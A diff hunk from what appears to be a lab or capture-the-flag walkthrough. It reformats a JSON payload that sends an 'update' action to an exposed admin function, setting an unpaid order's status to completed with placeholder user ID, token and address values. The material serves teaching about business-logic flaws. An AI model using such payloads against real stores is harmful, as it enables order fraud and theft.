@@ -15,7 +15,27 @@ Now that we have an order that is missing only the payment, let's exploit.
 To admin function receives an order Id and the parameters to update, so we can send something like that:
 
 ```
-neworder = {"body":{"action":"update", "order-id": "cc241d5c-f665-48db-8e55-4391f62465ba", "item":{"userId": "12312312-1233-1233-1233-123123123123", "token": "aSD32d2ASd2", "ts": "1545594489", "itemList": {"20":2}, "address": {"name": "john doe", "email": "secret@email.com", "address": "po box 12333"}, "total":25, "status":120}}}
+{
+  "body": {
+    "action": "update",
+    "order-id": "cc241d5c-f665-48db-8e55-4391f62465ba",
+    "item": {
+      "userId": "12312312-1233-1233-1233-123123123123",
+      "token": "aSD32d2ASd2",
+      "ts": "1545594489",
+      "itemList": {
+        "20": 2
+      },
+      "address": {
+        "name": "john doe",
+        "email": "secret@email.com",
+        "address": "po box 12333"
+      },
+      "total": 25,
+      "status": 120
+    }
+  }
+}
 ```
 
 Now, we have to pass it as part of the exploit itself:
